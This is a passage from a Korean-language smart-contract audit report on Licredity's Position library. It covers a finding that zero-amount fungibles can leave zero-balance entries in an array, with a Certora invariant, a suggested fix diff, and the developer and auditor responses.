**Licredity:** [PR#66](https://github.com/Licredity/licredity-v1-core/pull/66/files) 및 [PR#77](https://github.com/Licredity/licredity-v1-core/pull/77/files)의 커밋 [`7498ea0`](https://github.com/Licredity/licredity-v1-core/commit/7498ea007b4ad6975653bea08e27c2899f6bc413) 및 [`9be45ef`](https://github.com/Licredity/licredity-v1-core/commit/9be45efe7986e34bd184de151fa2d5dd3f81e9db)에서 수정되었습니다.

**Cyfrin:** 확인됨. 중간 32비트는 이제 비교 시 무시됩니다.

### 대체 가능(Fungible) 배열에 잔액이 0인 항목 포함 가능

**설명:** `addFungible` 함수는 0 금액의 대체 가능 자산 추가를 허용하는 반면, `removeFungible`은 잔액이 0에 도달하면 대체 가능 자산을 올바르게 제거합니다. 이는 `fungibles` 배열이 `fungibleStates`에 0 잔액을 가진 항목을 합법적으로 포함할 수 있는 불일치를 생성합니다.

**파급력:** 상태 불일치를 생성하는 엣지 케이스.

**개념 증명 (Proof of Concept):** ❌위반됨: https://prover.certora.com/output/52567/0586939d1ed34d3aa9e7292ab15eb1f9/?anonymousKey=07ffaae5e729a887ef83913c7d3e25027f3f51a2

```solidity
// VS-LI-08: 배열의 Fungibles는 0이 아닌 잔액을 가진 해당 fungibleStates를 가져야 함
// fungibles 배열의 모든 fungible에 대해, 0이 아닌 잔액을 가진 해당 fungibleStates 항목이 있어야 함
invariant fungiblesHaveNonZeroBalance(env e)
    forall uint256 positionId. forall uint8 i.
        i < ghostLiPositionFungiblesLength[positionId]
            => ghostLiPositionFungibleStatesBalance112[positionId][ghostLiPositionFungibles[positionId][i]] != 0
filtered { f -> !EXCLUDED_FUNCTION(f) } { preserved with (env eFunc) { SETUP(e, eFunc); } }
```

**권장 완화 방법:**
```diff
diff --git a/core/src/types/Position.sol b/core/src/types/Position.sol
index 929f27e..d346262 100644
--- a/core/src/types/Position.sol
+++ b/core/src/types/Position.sol
@@ -44,6 +44,9 @@ library PositionLibrary {
         FungibleState state = self.fungibleStates[fungible];

         if (state.index() == 0) {
+
+            require(amount != 0); // @certora fix for fungiblesHaveNonZeroBalance
+
             // add a fungible to the fungibles array
             assembly ("memory-safe") {
                 let slot := add(self.slot, FUNGIBLES_OFFSET)
```

✅통과됨 (수정 후): https://prover.certora.com/output/52567/d54bd10fcbb1482fb2392dbe9a4a122f/?anonymousKey=410cd2a910ca4d91e2ec8d457aff189648ade968

**Licredity:** [PR#67](https://github.com/Licredity/licredity-v1-core/pull/67/files)의 커밋 [`7eba957`](https://github.com/Licredity/licredity-v1-core/commit/7eba95743ed72eed62e826cc168edd7ca4becb92)에서 수정되었습니다. 우리는 쓸모없지만 해롭지 않은 작업을 불허하지 않는 것을 선호합니다. 따라서 상태 변경(이벤트 제외)을 방지하지만 revert하지는 않습니다.

**Cyfrin:** 확인됨. `amount`가 0이면 상태 변경 없음.

\clearpage
